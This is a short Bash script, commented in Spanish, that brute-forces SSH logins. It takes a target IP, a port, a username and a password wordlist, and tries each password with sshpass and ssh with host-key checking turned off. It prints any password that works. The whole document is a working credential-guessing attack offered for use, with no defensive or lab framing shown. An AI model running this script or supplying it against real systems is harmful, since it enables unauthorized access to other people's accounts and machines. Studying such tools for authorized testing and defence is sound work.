#!/bin/bash
# autor: Gustavo Sanchez Castro
# Verificamos que se proporcionen  los datos mencionados (IP , puerto ,Nombre de Usuario,Ruta Diccionario)
if [ $# -ne 4 ]; then
    echo "Uso: $0 <IP> <puerto> <usuario> <ruta_diccionario>"
    exit 1
fi

# Argumentos  recibidos
IP="$1"
PUERTO="$2"
USUARIO="$3"
DICCIONARIO="$4"

# En esta parte realizamos el ataque de fuerza bruta con el diccionario proporcionado usando sshpass que se instalo previamente
while read -r PASSWORD; do
    # Intenta autenticar con la contraseña del diccionario
    sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -p "$PUERTO" "$USUARIO"@"$IP" id &>/dev/null

    # Verifica el código de salida del comando anterior
    if [ $? -eq 0 ]; then
        echo "Contraseña exitosa: $PASSWORD"
        exit 0
    fi
done < "$DICCIONARIO"

echo "No se encontró una contraseña válida en el diccionario."
exit 1

